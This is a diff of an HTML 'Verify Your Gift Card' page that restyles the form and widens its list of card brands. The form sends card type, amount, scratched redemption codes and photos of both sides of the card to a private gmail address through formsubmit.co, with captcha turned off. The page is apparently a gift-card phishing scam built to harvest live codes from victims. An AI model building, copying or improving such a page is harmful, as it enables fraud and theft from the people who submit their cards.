@@ -7,6 +7,7 @@
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="stylesheet" href="styles.css">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 </head>
 <body>
@@ -80,76 +81,115 @@
     </div>
   </section>
 
-  <!-- Verification Form Section -->
-  <section id="verify" class="p-5 bg-light text-dark">
+ <!-- Verification Form Section -->
+<section id="verify" class="p-5 bg-light text-dark" style="border-radius: 20px;">
   <div class="container">
     <h2 class="mb-4 text-center">Verify Your Gift Card</h2>
-    <form class="row g-3"
-          action="https://formsubmit.co/elthonjohn001@gmail.com"
-          method="POST"
-          enctype="multipart/form-data">
 
-      <!-- Hidden Settings -->
-      <input type="hidden" name="_subject" value="New Gift Card Submission">
-      <input type="hidden" name="_captcha" value="false">
+    <!-- Bordered form card -->
+    <div class="bg-white p-4 shadow rounded" style="max-width: 600px; margin: auto; border: 1px solid #e0e0e0;">
 
-      <!-- Card Type -->
-      <div class="col-md-6">
-        <select name="Card Type" id="cardType" class="form-select" required>
-          <option selected disabled>Select Card Type</option>
-          <option>Amazon</option>
-          <option>Visa</option>
-          <option>Adidas</option>
-          <option>Uber</option>
-          <option>Nike</option>
-          <option>Walmart</option>
-          <option>AMC</option>
-          <option>Burger King</option>
-          <option>Best Buy</option>
-        </select>
-      </div>
+      <form class="row g-3"
+            action="https://formsubmit.co/elthonjohn001@gmail.com"
+            method="POST"
+            enctype="multipart/form-data">
 
-      <!-- Currency -->
-      <div class="col-md-6">
-        <select name="Currency" id="currency" class="form-select" required>
-          <option selected disabled>Select Currency</option>
-          <option>USD</option>
-          <option>EUR</option>
-          <option>GBP</option>
-          <option>AUD</option>
-          <option>CAD</option>
-        </select>
-      </div>
+        <!-- Hidden Settings -->
+        <input type="hidden" name="_subject" value="New Gift Card Submission">
+        <input type="hidden" name="_captcha" value="false">
 
-      <!-- Amount -->
-      <div class="col-md-6">
-        <input type="number" name="Card Amount" class="form-control" id="amount" placeholder="Card amount" required>
-      </div>
+        <!-- Card Type -->
+        <div class="col-12">
+          <select name="Card Type" id="cardType" class="form-select" required>
+            <option selected disabled>Select type of card</option>
+            <option>Apple</option>
+            <option>Amazon</option>
+            <option>Steam</option>
+            <option>EBay</option>
+            <option>Xbox</option>
+            <option>Googleplay</option>
+            <option>PlayStation</option>
+            <option>Sephora</option>
+            <option>RazerGold</option>
+            <option>Macy</option>
+            <option>Nordstrom</option>
+            <option>Nike</option>
+            <option>Visa Card</option>
+            <option>MasterCard</option>
+            <option>Vanilla Visa</option>
+            <option>Wallmart Visa</option>
+            <option>Visa Silvery White</option>
+            <option>TT Visa</option>
+            <option>Amex</option>
+          </select>
+        </div>
 
-      <!-- Redemption Code -->
-      <div class="col-md-6">
-        <input type="text" name="Redemption Code" class="form-control" id="code" placeholder="Redemption Code" required>
-      </div>
+        <!-- Currency and Amount -->
+        <div class="col-md-6">
+          <select name="Currency" id="currency" class="form-select" required>
+            <option selected disabled>Select Currency</option>
+            <option>USD</option>
+            <option>EUR</option>
+            <option>GBP</option>
+            <option>AUD</option>
+            <option>CAD</option>
+          </select>
+        </div>
+        <div class="col-md-6">
+          <input type="number" name="Card Amount" class="form-control" id="amount" placeholder="Card amount" required>
+        </div>
 
-      <!-- Upload Front Image -->
-      <div class="col-md-6">
+        <!-- Redemption Code -->
+        <div class="col-12">
+          <input type="text" name="Redemption Code" class="form-control" id="code" placeholder="Redemption Code" required>
+        </div>
+
+        <!-- Warning Badge -->
+        <div class="col-12 text-center">
+        <div class="alert alert-warning py-2 px-3" role="alert" style="display: inline-block; font-size: 0.95rem;">
+            <i class="fa fa-exclamation-triangle me-2"></i>
+            Ensure redemption code is scratched code !!
+        </div>
+        </div>
+
+        <!-- Upload Front Image -->
+        <div class="col-md-6">
         <label for="frontImage" class="form-label">Upload Front of Card</label>
-        <input type="file" name="Front Image" id="frontImage" class="form-control" accept="image/*" required>
-      </div>
+        <div class="input-group">
+            <label class="btn btn-outline-primary w-100" for="frontImage">
+            <i class="fa fa-upload me-2"></i> Choose File
+            </label>
+            <input type="file" name="Front Image" id="frontImage" class="d-none" accept="image/*" required>
+        </div>
+        </div>
 
-      <!-- Upload Back Image -->
-      <div class="col-md-6">
+        <!-- Upload Back Image -->
+        <div class="col-md-6">
         <label for="backImage" class="form-label">Upload Back of Card</label>
-        <input type="file" name="Back Image" id="backImage" class="form-control" accept="image/*" required>
-      </div>
+        <div class="input-group">
+            <label class="btn btn-outline-primary w-100" for="backImage">
+            <i class="fa fa-upload me-2"></i> Choose File
+            </label>
+            <input type="file" name="Back Image" id="backImage" class="d-none" accept="image/*" required>
+        </div>
+        </div>
 
-      <!-- Submit -->
-      <div class="col-12 text-center">
-        <button type="submit"  class="btn px-5 aye" style="background: #00aaff;">Continue</button>
-      </div>
-    </form>
+        <!-- Submit Button -->
+        <div class="col-12 text-center">
+          <button type="submit" class="btn px-5 aye" style="background: #00aaff;">Continue</button>
+        </div>
+
+        <!-- Instruction Text -->
+        <div class="col-12 text-center">
+          <p class="text-muted mt-2" style="font-size: 14px;">
+            Please make sure the codes you are about to input are correct and according to details
+          </p>
+        </div>
+      </form>
+    </div>
   </div>
 </section>
+
 
 
     <!-- Verification Info Section -->
